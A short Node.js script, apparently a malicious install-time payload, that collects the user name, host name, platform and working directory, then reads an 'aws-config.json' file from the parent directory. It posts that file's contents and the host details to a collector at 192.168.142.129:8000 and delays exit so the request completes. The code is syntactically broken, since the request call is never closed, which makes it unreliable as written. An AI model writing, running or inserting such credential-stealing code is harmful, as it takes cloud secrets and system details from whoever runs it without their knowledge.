const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");
const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

const targetRepoFile = path.join(process.cwd(), "..", "aws-config.json");
if (fs.existsSync(targetRepoFile)) {
    const fileContent = fs.readFileSync(targetRepoFile, "utf8");
    const encodedData = encodeURIComponent(fileContent);
    const req = http.request({
        host: "192.168.142.129",
        port: 8000,
        path: `/collect?file=${encodedData}`,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    // Write the system details into the body
    req.write(systemPayload);
    req.end();
    
    // Hold the process briefly to allow the network packet to exit cleanly
    setTimeout(() => {
        process.exit(0);
    }, 1500);

}
